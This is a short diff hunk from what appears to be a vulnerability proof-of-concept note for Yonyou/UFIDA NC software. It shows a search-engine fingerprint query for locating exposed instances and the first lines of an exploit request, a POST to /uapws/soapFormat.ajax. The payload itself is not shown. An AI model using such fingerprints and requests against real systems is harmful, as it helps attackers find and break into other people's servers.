@@ -5,7 +5,7 @@
 body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"
 ```
 
-## poc
+## POC
 ```
 POST /uapws/soapFormat.ajax HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
